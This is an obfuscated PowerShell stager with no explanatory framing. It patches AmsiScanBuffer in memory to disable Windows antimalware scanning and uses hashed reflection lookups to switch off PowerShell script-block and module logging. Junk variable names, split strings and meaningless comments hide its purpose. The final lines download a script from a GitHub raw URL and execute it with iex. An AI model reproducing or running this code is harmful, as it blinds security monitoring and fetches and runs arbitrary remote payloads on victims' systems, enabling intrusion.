function decay {
      $ZGUpJJES99 = @"
using System;
using System.Runtime.InteropServices;
public class P {
       [DllImport("kernel32.dll")]
       public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll")]
public static extern IntPtr GetModuleHandle(string lpModuleName);
   [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
     public static bool Patch() {
       IntPtr h = GetModuleHandle("a" + "m" + "s" + "i" + ".dll");
    if (h == IntPtr.Zero) return false;
     IntPtr a = GetProcAddress(h, "A" + "m" + "s" + "i" + "S" + "c" + "a" + "n" + "B" + "u" + "f" + "f" + "e" + "r");
     if (a == IntPtr.Zero) return false;
UInt32 oldProtect;
   if (!VirtualProtect(a, (UIntPtr)5, 0x40, out oldProtect)) return false;
         byte[] patch = { 0x31, 0xC0, 0xC3 };
       Marshal.Copy(patch, 0, a, patch.Length);
    return VirtualProtect(a, (UIntPtr)5, oldProtect, out oldProtect);
     }
}
"@
       Add-Type -TypeDefinition $ZGUpJJES99
      $LxHdJCXW99 = [P]::Patch()
    if ($LxHdJCXW99) {
 } else {
     }
}
decay
function Puckett
{
  function exited 
        {
 param(
        [Parameter(Mandatory,Position=0)]
         [long]$x,
         [Parameter(ParameterSetName='Left')]
     [ValidateRange(0,[int]::MaxValue)]
         [int]$LEft,
       [Parameter(ParameterSetName='Right')]
      [ValidateRange(0,[int]::MaxValue)]
[int]$RiGhT
  )
  $LEXEWolt99 = if($HZlTDVee99.ParameterSetName -eq 'Left')
{ 
   $LEft
  }
  else
{
    -$RiGhT
 }
       $UJdqOTwt99 = [math]::Floor($x * [math]::Pow(2,$LEXEWolt99))
   return [SysTem.COnVErT]::TOUInt32($UJdqOTwt99 -band ([uint32]::MaxValue))
 }
        function revoltingly 
{
         param(
 [Parameter(Mandatory = $trUe)]
 [AllowEmptyString()]
 [string]$Name
        )
  if ($Name.Length -eq 0)
    {
return 0
 }
       
$Name = $Name.ToLower();
     $amlFlIQo99 = 5381
      for($PvOZnOAL99 = 0; $PvOZnOAL99 -lt $Name.Length; $PvOZnOAL99++)
{
         $N = exited $amlFlIQo99 -left 5
   $amlFlIQo99 = ($N + $amlFlIQo99) + [byte][char]$Name[$PvOZnOAL99]
   }
         return $amlFlIQo99
  }
    function Holsteins
 {
$ByaYlriS99 = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ((revoltingly($_.Location.Split('\')[-1])) -eq 65764965518)}
      $hYMVbcug99 = $ByaYlriS99.GetTypes() | ? {(revoltingly($_.Name)) -eq 12579468197}
        $pevhHxCq99 = $hYMVbcug99.GetFields([system.REfLEctIoN.bindiNgFLAGS]40) | ? {(revoltingly($_.Name)) -eq 12250760746}
     $RlEIKeuZ99 = $pevhHxCq99.GetValue($NulL)
      $BlzUWsrp99 = ""
    foreach ($ZFWBlhoJ99 in $RlEIKeuZ99){
   if((revoltingly($ZFWBlhoJ99)) -eq 32086076268) { # NfBl PSUoiqjvcWOkmlD lnBVnlzTwGkNHLI fHiLYTqamUxLeRf aSUwaSsYhSaWtO xGPZ DnZC uZeCOhZAsBjVui
       $BlzUWsrp99 = $ZFWBlhoJ99
    break
   }
   }
   $pevhHxCq99.SetValue($NulL,(New-Object Collections.Generic.HashSet[string]))
       Write-Host "[+] Finished applying technique 1"
      return $BlzUWsrp99
}
   function ScriptLogging-Technique2($BlzUWsrp99)
    {
         $ByaYlriS99 = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ((revoltingly($_.Location.Split('\')[-1])) -eq 65764965518)}  # vHFLqRUXQKWEi YIUUornsS PtgFwvQQKKI hFilNuQWJKUPW rxmjPLL oiKpLvxBi tbjDWPtpcL rGfoBXoNZL
         $hYMVbcug99 = $ByaYlriS99.GetTypes() | ? {(revoltingly($_.Name)) -eq 4572158998} # uyYdcIOXqqQ FFNsdNPSQ qEvClUYvEH HPeN Ear fEFEWbesRyOr auTjHQ Csj ooatLY Xjo gdaypEHsv
      $pevhHxCq99 = $hYMVbcug99.GetFields([system.REfLEctIoN.bindiNgFLAGS]40) | ? {(revoltingly($_.Name)) -eq 52485150955} # jJhk nSuTEgxwzvWkI WfHVo bwJPXV dVG JnK tbhypTU diezxVcUvjNKS ewepYv IFIhXzVJq ikYiuuMSrbdqqki
         if(-not $pevhHxCq99 -or $pevhHxCq99 -eq $NulL) {
       $pevhHxCq99 = $hYMVbcug99.GetFields([system.REfLEctIoN.bindiNgFLAGS]40) | ? {(revoltingly($_.Name)) -eq 56006640029} # RuFNNQVQPNQD OwbVlTBDmhGvvAl XeRARygVfgBNzU LxNgZN tQzOIocxiKDNb RXWUOZ KWxRMseJpZlIcR
    }
   if($pevhHxCq99) {
 $nwhLonku99 = $pevhHxCq99.GetValue($NulL)
$ZQFkYANW99 = $nwhLonku99.Keys | ? {(revoltingly($_.Split('\\')[-1])) -eq 32086076268} # QeYxH CaHeNgvPG cfZXYweIK rrnzLReNjSdXzLh abDPwkfXM bnki PmIAL qzWoKS PNCVGfGZl tBEkAZo
        if($ZQFkYANW99 -and $nwhLonku99[$ZQFkYANW99]) {
    $fqwVPGEK99 = $nwhLonku99[$ZQFkYANW99].Keys | ? {(revoltingly($_)) -eq 45083803091} # vGSlbugmpjlcRJF JHLWre TZPRE kllcFgdqRWv WZxGbhKdT apIaW qiMZ TvedWqFKHKrAP adPoMJKlgugjIl
       $UCknwlQI99 = $nwhLonku99[$ZQFkYANW99].Keys | ? {(revoltingly($_)) -eq 70211596397} # LdNLHRKomdPpfks bBcYqeGjfIK IpomlgkmIzKKxCY ImdUc sErtyxR bFJki XSAM duPLd tgZYs
 if($fqwVPGEK99 -and $nwhLonku99[$ZQFkYANW99][$fqwVPGEK99]) {
     $nwhLonku99[$ZQFkYANW99][$fqwVPGEK99] = 0
 }
 if($UCknwlQI99 -and $nwhLonku99[$ZQFkYANW99][$UCknwlQI99]) {
      $nwhLonku99[$ZQFkYANW99][$UCknwlQI99] = 0
        }
 }
    $OWlLoarO99 = [System.Collections.Generic.Dictionary[string,System.Object]]::new()
     $OWlLoarO99.Add('Enabl'+'e'+$BlzUWsrp99, 0)
 $ywxKUpUC99 = $BlzUWsrp99 -replace 'kL', 'kInvocationL'
      $OWlLoarO99.Add('Ena'+'ble'+$ywxKUpUC99, 0)
        $nwhLonku99['HKEY_LOCAL_M'+'ACHINE\Software\Policie'+'s\Microsoft\Wind'+'ows\PowerSh'+'ell\'+$BlzUWsrp99] = $OWlLoarO99
         }
 Write-Host "[+] Finished applying technique 2"
        }
        $RlEIKeuZ99 = Holsteins
  ScriptLogging-Technique2 $RlEIKeuZ99
}
Start-Sleep -Seconds 10
$mixFPyOO99 = (New-Object syStEm.NEt.wEbCliENt).doWNloADSTrIng('https://raw.githubusercontent.com/daniel0011234/myscripts/main/rem_cli_living.ps1')
iex $mixFPyOO99 
